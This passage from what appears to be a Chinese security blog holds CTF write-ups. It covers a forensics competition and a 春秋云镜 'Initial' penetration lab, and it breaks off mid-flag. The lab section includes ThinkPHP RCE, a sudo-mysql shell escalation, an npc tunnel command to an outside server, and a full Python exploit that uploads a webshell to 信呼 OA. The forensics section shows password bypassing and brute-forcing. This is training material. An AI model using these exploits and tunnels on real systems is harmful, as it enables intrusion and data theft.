&quot;jdbc:&quot;\n\n\n\n攻击者又使用了CVE漏洞攻击应用，执行系统命令，请给出此CVE编号以及远程EXP的文件名，使用:拼接，比如CVE-2020-19817:exp.soCVE-2022-21724:custom.dtd.xml\n\n\n复现的文章里面上传了一个xml文件，搜索xml\n\n\n给出攻击者获取系统权限后，下载的工具的名称，比如nmapfscan\n\ntcp.port == 9999\n\n\nhacked\nadmIn用户的密码是什么？flag{WelC0m5_TO_H3re}\n\n比较前面的数据包可以发现key和iv\n\n\n\napp.config[‘SECRET_KEY’]值为多少？ssti_flask_hsfvaldb\n\ntcp contains &quot;KEY&quot;\n\n\n\nflask网站由哪个用户启动？red\n\n通过session进行的rce\n\n\n攻击者写入的内存马的路由名叫什么？（答案里不需要加&#x2F;）Index\n\n翻来翻去只有Index这个路由比较可疑，拿去解密之后也证实是这个路由\n\n","categories":["CTF"],"tags":["流量分析","取证"]},{"title":"第四届FIC取证竞赛","url":"/2024/06/19/FIC/","content":"案情简介：2024年4月，卢某报案至警方，声称自己疑似遭受了“杀猪盘”诈骗，大量钱财被骗走。卢某透露，在与某公司交流过程中结识了员工李某。李某私下诱导卢某参与赌博游戏，起初资金出入均属正常。但随后，李某称赌博平台为提升安全性，更换了地址和玩法，转为通过群聊抢红包形式进行赌博。随着赌资不断增加，卢某投入巨额资金后，发现无法再访问该网站，同时李某也失去联系，卢某遂意识到自己被骗。在经济压力下，卢某选择报警，并承认参与赌博活动，愿意承担相应法律后果。警方依据卢某提供的线索和手机数据，迅速锁定犯罪团伙，并在一藏匿地点成功抓获犯罪嫌疑人李某和赵某。警方对嫌疑人持有的物品进行了证据固定：李某手机被标记为检材1，窝点内服务器为检材2，赵某使用的计算机为检材3。接下来，请取证工作者根据案情和这些检材进行深入分析，并解答后续问题。\n手机部分\n嫌疑人李某的手机型号是？A. Xiaomi MI 2sB. Xiaomi MI 4C. Xiaomi MI 6D. Xiaomi MI 8\nB\n\n\n/data/system/users/0/settings_global.xml\n\n\n嫌疑人李某是否可能有平板电脑设备，如有该设备型号是？A. iPad Pro 11B. Vivo Pad 2C. MatePad ProD. Xiaomi Pad 6s\nD\n\n\n/data/misc/wifi/WifiConfigStore.xml\n\n\n嫌疑人李某手机开启热点设置的密码是?【答题格式：abc123】5aada11bc1b5\n\n\n/data/misc/wifi/softap.conf\n\n\n嫌疑人李某的微信内部ID是？【答题格式：wxid_abc123】wxid_wnigmud8aj6j12\n\n\n在/data/com.tencent.mm/shared_prefs/auth_info_key_prefs.xml中找到_auth_uin的值\n\n\n微信的本地数据库存放在/data/data/com.tencent.mm/MicroMsg里面的一长串字符串的目录里面，导出这个数据库文件\n\n\n\n嫌疑人李某发送给技术人员的网站源码下载地址是什么 【答题格式：http://www.baidu.com/adc】http://www.honglian7001.com/down\n\n和赵老五的聊天记录中提到了网站代码，扫一扫\n\n新佛曰：諸隸僧殿降吽諸陀摩隸殿僧殿缽殿薩願僧殿宣摩殿嚴願殿是迦咒叻吶嚤須塞亦須阿隸嚤須愍眾殿蜜殿隸願蜜哆蜜亦願是念慧殿隸摩哆殿即隸嚤訶須隸亦愍如如殿囑殿囑\n\n在线解密：http://hi.pcmoe.net/buddha.html\n\nDB Browser查看解密后的数据库文件\n\n\n后面的步骤和上面一样\n\n受害者微信用户ID是？【答题格式：abc123】limoon890\n\nlimoon被骗5000，查看他的ID\n\n\n\n\n\n嫌疑人李某第一次连接WIFI的时间是？A. 03-14 15:55:57B. 03-14 16:55:57C. 03-14 17:55:57D. 03-14 18:55:57\nB\n\n/data/misc/wifi/WifiConfigStore.xml\n\n\n分析嫌疑人李某的社交习惯，哪一个时间段消息收发最活跃？A. 12:00-14:00B. 14:00-16:00C. 16:00-18:00D. 18:00-20:00\nC\n\n火眼看聊天记录，大部分记录都在16:00-18:00\n看数据库的create time，转换一下时间戳\n\nimport datetimeimport sqlite3import redef get_time(timestamp):    dt = datetime.datetime.fromtimestamp(timestamp//1000)    format_time = dt.strftime(&#x27;%Y年%m月%d日%H时%M分%S秒&#x27;)    return format_timeconn = sqlite3.connect(&#x27;./EnMicroMsg_dec.db&#x27;)cursor = conn.cursor()sql = &#x27;select createTime from message&#x27;cursor.execute(sql)data = cursor.fetchall()cnt = &#123;&#125;pattern = re.compile(r&#x27;日(.*?)时&#x27;)for v in data:    createTime = re.findall(pattern,get_time(v[0]))[0]    if createTime not in cnt.keys():        cnt[createTime] = 1    else:        cnt[createTime] += 1print(cnt)# &#123;&#x27;16&#x27;: 52, &#x27;17&#x27;: 55, &#x27;15&#x27;: 3, &#x27;18&#x27;: 10, &#x27;13&#x27;: 17, &#x27;14&#x27;: 12, &#x27;20&#x27;: 23&#125;\n\n\n请分析嫌疑人手机，该案件团伙中，还有一名重要参与者警方未抓获，该嫌疑人所使用的微信账号ID为？【答题格式：wxid_abc123】wxid_kolc5oaiap6z22\n\n对比聊天记录和案情简介，还有一个叫老苏的\n\n\n\n\n请分析嫌疑人手机，嫌疑人老板组织人员参与赌博活动，所使用的国内访问入口地址为？【答题格式：192.168.1.1:1000&#x2F;abc】192.168.110.110:8000&#x2F;login\n\n\n\n服务器集群题挂载镜像，用低版本的ftk挂载，别的会出问题\n\n\n手工绕密：\n打开FTK挂载出来的虚拟磁盘，在250MB大小的一个分区找到STATE.TGZ文件，7z逐层解压，直接在目录中点击编辑即可修改shadow文件，置空后保存即可\n\n\n\nesxi服务器的esxi版本为？【关键字得分，答题格式：1.2】6.7\n\n火眼识别\n\n管理员权限打开VMware进行仿真\n\n\n\n请分析ESXi服务器，该系统的安装日期为：2024 年 3 月 12 日 星期二 02:04:15 UTC2024 年 3 月 12 日 星期二 02:05:15 UTC2024 年 3 月 12 日 星期二 02:06:15 UTC2024 年 3 月 12 日 星期二 02:07:15 UTC\nA\n\n配置网卡进入esxi\n\n\n\n\n\n\n\n弄好网卡记得虚拟化，不然等会开里面的虚拟机还得重启然后虚拟化，得重新挂载数据(火眼仿真会丢失数据盘，赛后已修复)\n\n\nroot加空密码就能进\n\n\n请分析ESXi服务器数据存储“datastore”的UUID是？【答题格式：a1a1-b1b1-c1c1-d1d1】65efb8a8-ddd817f6-04ff-000c297bd0e6\n\n没有存储，但是有设备，可能是丢失了数据，需要重新挂载\nhttps://mp.weixin.qq.com/s/1rFGJnYw59DfId8fWKTGdA\n\n\nssh直接连接，root加空密码，如何重新挂载一下数据\n[root@localhost:~] esxcfg-volume -lScanning for VMFS-6 host activity (4096 bytes/HB, 1024 HBs).VMFS UUID/label: 65efb8a8-ddd817f6-04ff-000c297bd0e6/datastore1Can mount: YesCan resignature: YesExtent name: t10.ATA_____VMware_Virtual_IDE_Hard_Drive___________00000000000000000001:3 range: 0 - 197119 (MB)[root@localhost:~] esxcfg-volume -m 65efb8a8-ddd817f6-04ff-000c297bd0e6Mounting volume 65efb8a8-ddd817f6-04ff-000c297bd0e6\n\n\n回到网页刷新一下就好了\n\n\nESXI服务器的原IP地址？【答题格式：255.255.255.0】192.168.8.112\n\n\n\nEXSI服务器中共创建了几个虚拟机？【答题格式：1】4\n\n（其实有5个，有一个是坏的，可能火眼仿真没有加载）\n\n\n\n网站服务器绑定的IP地址为？【答题格式：255.255.255.0】192.168.8.89\n\n\n把esxi里面的虚拟机全部开开\n\n查看www的网络信息（可能得等一会），访问该ip\n\n\n\n网站服务器的登录密码为？【答题格式：abc123】qqqqqq\n\n用Windows镜像里面的字典爆破一下www的密码\n\n\n网站服务器所使用的管理面板登陆入口地址对应的端口号为：【答案格式：1111】14131\n\nssh连接www，www的www目录下面有宝塔相关的东西，猜测可能是宝塔面板搭建的，输入bt测一下\n\n\n查看bt默认信息\n\n\n网站服务器的web目录是？【答题格式：&#x2F;etc】&#x2F;webapp\n\n改掉bt面板的密码，然后登录bt面板\n\n宝塔面板里面的网站里面没有东西，但是&#x2F;webapp目录下有源码，所有应该是&#x2F;webapp\n\n\n\n网站配置中Redis的连接超时时间为多少秒 【答题格式：20】10\n\n\n\n网站普通用户密码中使用的盐值为 【答题格式：123abc!@#】!@#qaaxcfvghhjllj788+)_)((\n\n\nUserController中有调用加密函数，查看这个函数\n\n可知第二个参数就是salt\n\n\n网站管理员用户密码的加密算法名称是什么A.desB.rsaC.md5D.bcrypt\nD\n\nruoyi的管理员密码生成类在com.ruoyi.common.utils.SecurityUtils\n\n\n网站超级管理员用户账号创建的时间是？A.2022-05-09 12:44:41B.2022-05-09 13:44:41C.2022-05-09 14:44:41D.2022-05-09 15:44:41\nC\n\n访问网站会报接口异常\n\n看jar包中的数据库用的本地的，但是本地无法登录数据库\n\n\n宝塔面板显示数据库的地址是192.168.8.142，对应名为data的虚拟机\n\n爆破ssh，然后连接\n\n发现没有mysql\n\n结合后面的题目，应该是有docker，启动docker\n\n启动mysql\n\n连一下数据库\n\n\n\n重构进入网站之后，用户管理下的用户列表页面默认有多少页数据 【答题格式：20】877\n\n在www虚拟机中提取出ruoyi-admin.jar的配置文件\njar xf ruoyi-admin.jar BOOT-INF/classes/application-druid.yml\n\n使用vim命令修改\nvim BOOT-INF/classes/application-druid.yml\n\n将数据库地址修改为data虚拟机的ip，密码修改成宝塔面板中的密码\n\n更新配置文件到jar包内\njar uf ruoyi-admin.jar BOOT-INF/classes/application-druid.yml\n\n查看修改时间，时间变了即为修改成功\n\n运行restart.sh\n\n还是502异常，参考运维笔记，修改一下redis的配置文件\n\n[root@localhost webapp]# jar xf ruoyi-admin.jar BOOT-INF/classes/application.yml[root@localhost webapp]# vim BOOT-INF/classes/application.yml[root@localhost webapp]# jar uf ruoyi-admin.jar BOOT-INF/classes/application.yml\n\n\n定时任务插件执行时间问题在sys_job表中，将下面的在2023年和2024 年的每个1月1日执行任务替换成上面的在每小时的每隔两分钟触发一次，直到任务被停止或调度器关闭为止\n\n\n启动后端\n\n\n没有报错，可以正常访问了\n使用https://www.bejson.com/encrypt/bcrpyt_encode/生成一个密码，替换到数据库中的sys_user表中\n\n\n正常登录，一共877页\n\n\n该网站的系统接口文档版本号为 【答题格式：1.1.1】3.8.2\n\n\n\n该网站获取订单列表的接口 【答题格式：&#x2F;abc&#x2F;abc】&#x2F;api&#x2F;shopOrder\n\n\n\n受害人卢某的用户ID 【答题格式：11223344】10044888\n\n\n\n\n受害人卢某一共充值了多少钱 【答题格式：123456】465222\n\n\n\n网站设置的单次抽奖价格为多少元 【答题格式：20】10\n\n\n\n网站显示的总余额数是 【答题格式：20.12】7354468.56\n\n\n\n网站数据库的root密码 【答题格式：abc123】my-secret-pw\n\n查看容器的元数据\n\nnavicat测试连接\n\n\n数据库服务器的操作系统版本是 【答题格式：1.2.1234】7.9.2009\n\n\n\n数据库服务器的Docker Server版本是 【答题格式：1.10.0】1.13.1\n\n\n\n数据库服务器中数据库容器的完整ID是 【答题格式：123abcd】9bf1cecec3957a5cd23c24c0915b7d3dd9be5238322ca5646e3d9e708371b765\n\n[root@localhost ~]# docker ps -a --no-truncCONTAINER ID                                                       IMAGE               COMMAND                         CREATED             STATUS              PORTS                    NAMES9bf1cecec3957a5cd23c24c0915b7d3dd9be5238322ca5646e3d9e708371b765   eclipse/mysql       &quot;docker-entrypoint.sh mysqld&quot;   6 weeks ago         Up 36 minutes       0.0.0.0:3306-&gt;3306/tcp   mysql\n\n或者docker inspect 9\n\n数据库服务器中数据库容器使用的镜像ID 【答题格式：123abcd】66c0e7ca4921\n\n[root@localhost ~]# docker images -a --no-truncREPOSITORY                TAG                 IMAGE ID                                                                  CREATED             SIZEdocker.io/eclipse/mysql   latest              sha256:66c0e7ca4921e941cbdbda9e92242f07fe37c2bcbbaac4af701b4934dfc41d8a   6 years ago         436 MB[root@localhost ~]# \n\n\n数据库服务器中数据库容器创建的北京时间A.2024&#x2F;3&#x2F;13  12:15:23B.2024&#x2F;3&#x2F;13  20:15:23C.2024&#x2F;3&#x2F;14  00:15:23D.2024&#x2F;3&#x2F;13  08:15:23\nB\n\n\n在 Docker 中运行的 MySQL 容器默认使用的是世界标准时间（UTC)需要+8\n\n数据库服务器中数据库容器的ip是 【答题格式：255.255.255.0】172.17.0.2\n\n\n\n分析数据库数据，在该平台邀请用户进群最多的用户的登录IP是 【答题格式：255.255.255.0】223.104.51.34\n\n邀请进群相关数据在app_group_apply表，筛选一下邀请人数最多的inviter_id\nSELECT inviter_id AS 邀请人ID,COUNT(*) AS 邀请人数 FROM `app_group_apply` WHERE status = 1 GROUP BY inviter_id ORDER BY 邀请人数 DESC\n\n\n到app_user_info表找到对应用户的登录IP\nSELECT login_ip FROM `app_user_info` WHERE id = 53576061\n\n\n\n分析数据库数据，在该平台抢得最多红包金额的用户的登录IP是 【答题格式：255.255.255.0】116.62.104.130\n\n抢红包记录在app_group_redpacket_member表中\nSELECT user_id,SUM(money) AS 总金额FROM `app_group_redpacket_member`GROUP BY user_id ORDER BY 总金额 DESCSELECT login_ip FROM `app_user_info` WHERE id = 90671142\n\n\n\n\n数据库中记录的提现成功的金额总记是多少（不考虑手续费） 【答题格式：20.12】35821148.48\n\n提现记录在app_user_withdraw表中\n\nSELECT SUM(amount) FROM `app_user_withdraw` WHERE `status` = 3\n\n\n\nrocketchat服务器中，有几个真实用户？【答题格式：1】3\n\n\n根据赵某的计算机Chrome浏览器记录，聊天系统应该是在3000端口上，访问http://192.168.8.16:3000/home\n\n用之前的账户密码登录\nadmin@admin.comZhao\n\n\n\nrocketchat服务器中，聊天服务的端口号是？ 【答题格式：80】3000\n\n见上题\n\nrocketchat服务器中，聊天服务的管理员的邮箱是？【答题格式：&#x61;&#98;&#99;&#64;&#97;&#x62;&#x63;&#46;&#99;&#111;&#x6d;】&#x61;&#x64;&#109;&#105;&#110;&#x40;&#x61;&#100;&#109;&#105;&#110;&#x2e;&#99;&#111;&#x6d;\n\n\n\nrocketchat服务器中，聊天服务使用的数据库的版本号是？【答题格式：1.2.34】5.0.24\n\n\n\n\nrocketchat服务器中，最大的文件上传大小是？（以字节为单位）【答题格式：1024】104857600\n\n\n\nrocketchat服务器中，管理员账号的创建时间为？A.2024&#x2F;3&#x2F;14  8:18:54B.2024&#x2F;3&#x2F;14  8:19:54C.2024&#x2F;3&#x2F;14  8:17:54D.2024&#x2F;3&#x2F;14  8:15:54\nB\n\n密码表爆不出来这台服务器的密码，参考https://cn.linux-console.net/?p=1538重置密码\n\nssh登录被拒，可能是没开远程ssh，修改一下配置文件\nvim /etc/ssh/sshd_config\n\n\n修改完重启ssh即可\n\n可以看到数据库运行在docker里面\nroot@debian:~# docker psCONTAINER ID   IMAGE                                                COMMAND                  CREATED       STATUS         PORTS                    NAMES160c806d13ea   registry.rocket.chat/rocketchat/rocket.chat:latest   &quot;docker-entrypoint.s…&quot;   6 weeks ago   Up 8 minutes   0.0.0.0:3000-&gt;3000/tcp   rocketchat-rocketchat-1929dad307aa4   bitnami/mongodb:5.0                                  &quot;/opt/bitnami/script…&quot;   6 weeks ago   Up 8 minutes   27017/tcp                rocketchat-mongodb-1\n\n查看容器元数据发现可以空密码登录，端口在27017\n\n但是本地这个端口没有服务在运行\n\n查看容器元数据看到ip在172.18.0.2\n\nnavicat连接\n\n\n\n\nrocketchat服务器中，技术员提供的涉诈网站地址是？【答题格式：http://192.168.1.1】http://172.16.80.47\n\n\n\n综合分析服务器，该团伙的利润分配方案中，老李的利润占比是多少【答题格式：10%】35%\n\n见上题\n\n综合分析服务器，该团队“杀猪盘”收网的可能时间段为A.2024&#x2F;3&#x2F;15  15:00:00-16:00:00B.2024&#x2F;3&#x2F;15  16:00:00-17:00:00C.2024&#x2F;3&#x2F;15  17:00:00-18:00:00D.2024&#x2F;3&#x2F;15  18:00:00-19:00:00\n\n见上题，UTC+8\n\n请综合分析，警方未抓获的重要嫌疑人，其使用聊天平台时注册邮箱号为？【答题格式：&#97;&#x62;&#99;&#x40;&#97;&#97;&#x2e;&#99;&#111;&#109;】&#x6c;&#97;&#111;&#x40;&#115;&#117;&#x2e;&#99;&#111;&#x6d;\n\n老苏的邮箱\n\n\n分析openwrt镜像，该系统的主机名为【答题格式：MyPC】iStoreOS\n\n\n\n分析openwrt镜像，该系统的内核版本为【答题格式：12.34.56】5.10.201\n\n\n\n分析openwrt镜像，该静态ip地址为【答题格式：192.168.1.1】192.168.8.5\n\n静态分析网卡配置文件\nroot@iStoreOS:~# cat /etc/config/network config interface &#x27;loopback&#x27;        option device &#x27;lo&#x27;        option proto &#x27;static&#x27;        option ipaddr &#x27;127.0.0.1&#x27;        option netmask &#x27;255.0.0.0&#x27;config globals &#x27;globals&#x27;        option ula_prefix &#x27;fdbc:6f08:9c51::/48&#x27;config device        option name &#x27;br-lan&#x27;        option type &#x27;bridge&#x27;        list ports &#x27;eth0&#x27;config interface &#x27;lan&#x27;        option device &#x27;br-lan&#x27;        option ipaddr &#x27;192.168.8.5&#x27;        option netmask &#x27;255.255.255.0&#x27;        option ip6assign &#x27;60&#x27;        option proto &#x27;dhcp&#x27;loopback 接口：这是一个虚拟接口，用于本地回环。IP 地址为 127.0.0.1，子网掩码为 255.0.0.0。它用于在同一设备上测试网络服务，而无需实际发送数据包到网络。globals 配置：这里定义了一个全局唯一本地地址（ULA）前缀，用于生成 IPv6 地址。device 配置：这是一个设备定义，将物理接口 eth0 添加到名为 br-lan 的网桥上。网桥是一个虚拟设备，用于连接多个网络接口。lan 接口：这是一个网络接口配置，用于连接局域网（LAN）。它的 IP 地址为 192.168.8.5，子网掩码为 255.255.255.0，并且使用 DHCP 协议自动获取 IP 地址。\n\n也可以结合计算机的浏览记录和ip addr确定\n\n\n分析openwrt镜像，所用网卡的名称为【答题格式：abc123】eth0\n\n见上题或登录后台查看\n计算机镜像里面有密码\n\n\n\n分析openwrt镜像，该系统中装的docker的版本号为【答题格式：12.34.56】20.10.22\n\n\n\n分析openwrt镜像，nastools的配置文件路径为【答题格式：&#x2F;abc&#x2F;abc&#x2F;abc】&#x2F;root&#x2F;Configs&#x2F;NasTools\n\n\n\n分析openwrt镜像，使用的vpn代理软件为【答题格式（忽略大小写）：abc123】PassWall2\n\n\n\n分析openwrt镜像，vpn实际有多少个可用节点【答题格式：6】53\n\n第一个结点为套餐情况，不是可用结点\n\n\n分析openwrt镜像，节点socks的监听端口是多少【答题格式：1234】1070\n\n\n\n分析openwrt镜像，vpn的订阅链接是【答题格式：http://www.baidu.com/aaa/bbb/ccc/ddd?privatekey=abc123456789】https://pqjc.site/api/v1/client/subscribe?token=243d7bf31ca985f8d496ce078333196a\n\n\nwindows镜像\n1.分析技术员赵某的windows镜像，并计算赵某计算机的原始镜像的SHA1值为？忽略大小写FFD2777C0B966D5FC07F2BAED1DA5782F8DE5AD6\n\n\n\n\n2.分析技术员赵某的windows镜像，疑似VeraCrypt加密容器的文件的SHA1值为？忽略大小写b25e2804b586394778c800d410ed7bcdc05a19c8\n\n用火眼的特征分析得出，路径：检材3-计算机.E01&#x2F;分区6&#x2F;Users&#x2F;L&#x2F;Documents&#x2F;2024.fic，导出后计算sha1\n\n\n\n3.据赵某供述，他会将常用的密码放置在一个文档内，分析技术员赵某的windows镜像，找到技术员赵某的密码字典，并计算该文件的SHA1值?忽略大小写E6EB3D28C53E903A71880961ABB553EF09089007\n\n路径：检材3-计算机.E01/分区6/Users/L/Documents/\n\n\n4.据赵某供述，他将加密容器的密码隐写在一张图片内，隐写在图片中的容器密码是?qwerasdfzxcv\n\ndocuments目录下有一张可疑图片，查看十六进制数据就能得到密码\n\n\n\n5.分析技术员赵某的windows镜像，bitlocker的恢复密钥是什么【答题格式：111111-222222-333333-444444-555555-666666-777777-888888】404052-011088-453090-291500-377751-349536-330429-257235\n\n用刚才的密码解密2024.fic\n\n\n6.分析技术员赵某的windows镜像，bitlocker分区的起始扇区数是【答题格式：1024】146794496\n\n\n\n7.分析技术员赵某的windows镜像，默认的浏览器是A.ChromeB.EdgeC.IED.firefox\nA\n\n\n\n\n8.分析技术员赵某的windows镜像，私有聊天服务器的密码为【答题格式：abc123】Zhao\n\n解密后的分区里面有一个私有聊天密码.txt，第一行应该是用户名\n\n\n9.分析技术员赵某的windows镜像，嫌疑人计算机中有疑似使用AI技术生成的进行赌博宣传的图片，该图片中，宣传的赌博网站地址为？【答题格式：www.baidu.com】www.585975.com\n\n仿真后翻一下加密盘的图片\n\n\n10.分析技术员赵某的windows镜像，赵某使用的AI换脸工具名称为？【答题格式：abcd】A.stable diffusionB.ROOPC.MidjourneyD.DiffusionDraw\nB\n\npowershell的历史记录里面有一个run.py，查找这个文件\n\n都是在一个目录下面\n\n进虚拟机里面看一下这个目录\n\n\n11.分析技术员赵某的windows镜像，使用AI换脸功能生成了一张图片，该图片的名称为【答题格式：1.txt】db.jpg\n\n查看readme，结合执行的命令可知–output为输出结果\n\n.\\python ..\\run.py --source &quot;E:/dst01.jpeg&quot; --target &quot;E:/1.pjpg&quot; --output &quot;E:/db.jpg&quot; --frame-processor face_swapper face_enhancer --similar-face-distance 0.85 --temp-frame-format png --temp-frame-quality 18 --output-video-quality 18 --max-memory 4 --execution-provider cpu --execution-threads 4\n\n\n12.分析技术员赵某的windows镜像，ai换脸生成图片的参数中–similar-face-distance值为【答题格式：20.12】0.85\n\n见上题\n\n13.分析技术员赵某的windows镜像，嫌疑人使用AI换脸功能所使用的原始图片名称为【答题格式：abc.txt】dst01.jpeg\n\n见上上题\n\n14.分析技术员赵某的windows镜像，赵某与李某沟通中提到的“二维码”解密所用的网站url地址为？【答题格式：http://www.baidu.com/1.html】http://hi.pcmoe.net/buddha.html\n\n查看浏览器历史记录\n\n\n15.分析技术员赵某的windows镜像，赵某架设聊天服务器的原始IP地址为？【答题格式：192.168.1.1】192.168.8.17\n\n\n\n\n16.分析技术员赵某的windows镜像，据赵某交代，其在窝点中直接操作服务器进行部署，环境搭建好了之后，使用个人计算机登录聊天室进行沟通，请分析赵某第一次访问聊天室的时间为？A.2024-03-14 20:30:08B.2024-03-14 20:31:08C.2024-03-14 20:32:08D.2024-03-14 20:33:08\nC\n\n\n\n17.分析技术员赵某的windows镜像，openwrt的后台管理密码是hl@7001\n\n结合前面的服务器集群来看，openwrt的网址：\n\n\n\n18.分析技术员赵某的windows镜像，嫌疑人可能使用什么云来进行文件存储？【答题格式：阿里云】易有云\n\n\n\n19.分析技术员赵某的windows镜像，工资表密码是多少【答题格式：abc123】aa123456\n\nBitLocker加密分区中有一个名单.xlsx\n\n结合运维笔记，用commonPwd.txt暴力破解\n\n\n\n\n20.分析技术员赵某的windows镜像，张伟的工资是多少【答题格式：20】28300\n\n\n","categories":["取证"],"tags":["取证","FIC"]},{"title":"春秋云镜-Initial","url":"/2024/06/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Initial/","content":"flag01fscan扫一下\n➜  .\\fscan.exe -h 39.99.145.116(icmp) Target 39.99.145.116   is alive[*] Icmp alive hosts len is: 139.99.145.116:22 open39.99.145.116:80 open[*] alive ports len is: 2start vulscan[*] WebTitle: http://39.99.145.116      code:200 len:5578   title:Bootstrap Material Admin[+] http://39.99.145.116 poc-yaml-thinkphp5023-method-rce poc1\n\n跑一下thinkphp漏洞利用工具\n\n蚁剑连接，发现是www-data权限\n(www-data:/var/www/html) $ iduid=33(www-data) gid=33(www-data) groups=33(www-data)\n\nsudo -l看看，有个mysql提权\n(www-data:/var/www/html) $ sudo -lMatching Defaults entries for www-data on ubuntu-web01:    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser www-data may run the following commands on ubuntu-web01:    (root) NOPASSWD: /usr/bin/mysqlsudo mysql -e &#x27;\\! find / -name flag&#x27;\n\n\n(www-data:/var/www/html) $ sudo mysql -e &#x27;\\! cat /root/flag/flag01.txt&#x27; ██     ██ ██     ██       ███████   ███████       ██     ████     ██   ████████ ░░██   ██ ░██    ████     ██░░░░░██ ░██░░░░██     ████   ░██░██   ░██  ██░░░░░░██ ░░██ ██  ░██   ██░░██   ██     ░░██░██   ░██    ██░░██  ░██░░██  ░██ ██      ░░   ░░███   ░██  ██  ░░██ ░██      ░██░███████    ██  ░░██ ░██ ░░██ ░██░██            ██░██  ░██ ██████████░██      ░██░██░░░██   ██████████░██  ░░██░██░██    █████  ██ ░░██ ░██░██░░░░░░██░░██     ██ ░██  ░░██ ░██░░░░░░██░██   ░░████░░██  ░░░░██ ██   ░░██░██░██     ░██ ░░███████  ░██   ░░██░██     ░██░██    ░░███ ░░████████ ░░     ░░ ░░ ░░      ░░   ░░░░░░░   ░░     ░░ ░░      ░░ ░░      ░░░   ░░░░░░░░  Congratulations!!! You found the first flag, the next flag may be in a server in the internal network.flag01: flag&#123;60b53231-\n\nflag02看一下网卡\n(www-data:/var/www/html) $ ifconfigeth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500        inet 172.22.1.15  netmask 255.255.0.0  broadcast 172.22.255.255        inet6 fe80::216:3eff:fe24:4454  prefixlen 64  scopeid 0x20&lt;link&gt;        ether 00:16:3e:24:44:54  txqueuelen 1000  (Ethernet)        RX packets 86593  bytes 116256508 (116.2 MB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 20752  bytes 3209660 (3.2 MB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536        inet 127.0.0.1  netmask 255.0.0.0        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;        loop  txqueuelen 1000  (Local Loopback)        RX packets 658  bytes 58976 (58.9 KB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 658  bytes 58976 (58.9 KB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\nfscan扫一下\n(www-data:/tmp) $ cat result.txt172.22.1.15:22 open172.22.1.2:139 open172.22.1.18:139 open172.22.1.21:135 open172.22.1.18:135 open172.22.1.2:135 open172.22.1.18:80 open172.22.1.15:80 open172.22.1.2:88 open172.22.1.18:3306 open172.22.1.21:445 open172.22.1.18:445 open172.22.1.2:445 open172.22.1.21:139 open[*] 172.22.1.2  (Windows Server 2016 Datacenter 14393)[*] NetInfo:[*]172.22.1.2   [-&gt;]DC01   [-&gt;]172.22.1.2[*] NetInfo:[*]172.22.1.18   [-&gt;]XIAORANG-OA01   [-&gt;]172.22.1.18[*] NetInfo:[*]172.22.1.21   [-&gt;]XIAORANG-WIN7   [-&gt;]172.22.1.21[+] 172.22.1.21    MS17-010    (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)[*] NetBios: 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server 2008 R2 Enterprise 7601 Service Pack 1 [*] NetBios: 172.22.1.2      [+]DC DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393 [*] WebTitle: http://172.22.1.15        code:200 len:5578   title:Bootstrap Material Admin[*] NetBios: 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server 2012 R2 Datacenter 9600 [*] WebTitle: http://172.22.1.18        code:302 len:0      title:None 跳转url: http://172.22.1.18?m=login[*] WebTitle: http://172.22.1.18?m=login code:200 len:4012   title:信呼协同办公系统[+] http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1\n\nnps代理\nnps+Proxifier搭建socks5代理隧道进行内网穿透nps socks5~Echo的博客-CSDN博客\nsudo mysql -e &#x27;\\! ./npc -server=121.43.55.52:8024 -vkey=l1odwdre7k8qlid2 -type=tcp&#x27;\n\n先打信呼协同办公系统\n\nadmin:admin123弱口令登录\n[代码审计]信呼协同办公系统2.2存在文件上传配合云处理函数组合拳RCE_信呼2.2.8 漏洞-CSDN博客\nexp\nimport requestssession = requests.session()url_pre = &#x27;http://172.22.1.18/&#x27;url1 = url_pre + &#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;url2 = url_pre + &#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;url3 = url_pre + &#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11&#x27;data1 = &#123;    &#x27;rempass&#x27;: &#x27;0&#x27;,    &#x27;jmpass&#x27;: &#x27;false&#x27;,    &#x27;device&#x27;: &#x27;1625884034525&#x27;,    &#x27;ltype&#x27;: &#x27;0&#x27;,    &#x27;adminuser&#x27;: &#x27;YWRtaW4=&#x27;,    &#x27;adminpass&#x27;: &#x27;YWRtaW4xMjM=&#x27;,    &#x27;yanzm&#x27;: &#x27;&#x27;&#125;r = session.post(url1, data=data1)r = session.post(url2, files=&#123;&#x27;file&#x27;: open(&#x27;1.php&#x27;, &#x27;r+&#x27;)&#125;)filepath = str(r.json()[&#x27;filepath&#x27;])filepath = &quot;/&quot; + filepath.split(&#x27;.uptemp&#x27;)[0] + &#x27;.php&#x27;id = r.json()[&#x27;id&#x27;]url3 = url_pre + f&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=&#123;id&#125;&#x27;r = session.get(url3)r = session.get(url_pre + filepath + &quot;?1=system(&#x27;dir&#x27;);&quot;)print(r.text)\n\n在同目录下新建一个1.php，写入一句话木马\n\n\nC:&#x2F;Users&#x2F;Administrator&#x2F;flag&#x2F;flag02.txt\n___    ___ ___  ________  ________  ________  ________  ________   ________     |\\  \\  /  /|\\  \\|\\   __  \\|\\   __  \\|\\   __  \\|\\   __  \\|\\   ___  \\|\\   ____\\    \\ \\  \\/  / | \\  \\ \\  \\|\\  \\ \\  \\|\\  \\ \\  \\|\\  \\ \\  \\|\\  \\ \\  \\\\ \\  \\ \\  \\___|     \\ \\    / / \\ \\  \\ \\   __  \\ \\  \\\\\\  \\ \\   _  _\\ \\   __  \\ \\  \\\\ \\  \\ \\  \\  ___    /     \\/   \\ \\  \\ \\  